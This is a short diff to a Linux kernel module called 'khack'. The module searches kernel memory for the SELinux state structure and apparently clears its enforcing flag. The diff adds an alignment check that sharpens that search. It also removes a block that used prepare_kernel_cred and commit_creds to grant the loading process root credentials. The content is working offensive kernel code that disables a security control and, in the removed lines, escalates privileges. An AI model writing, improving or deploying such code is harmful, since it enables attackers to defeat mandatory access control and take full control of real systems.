@@ -66,6 +66,8 @@ static int khack_clear_enforcing(void)
 
 			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
 				continue;
+			if ((a + i) & 7)     /* struct selinux_state holds pointers */
+				continue;
 			for (j = 4; j < 16; j++)
 				if (b[j] > 1) { ok = 0; break; }
 			if (!ok)
@@ -135,13 +137,6 @@ static int __init khack_init(void)
 	}
 
 	khack_clear_enforcing();
-
-	/* Escalate the loader too: finit_module() runs in its context. */
-	{
-		void *cred = p_prepare_kernel_cred(NULL);
-		if (cred)
-			p_commit_creds(cred);
-	}
 
 	ret = misc_register(&khack_dev);
 	if (ret) {
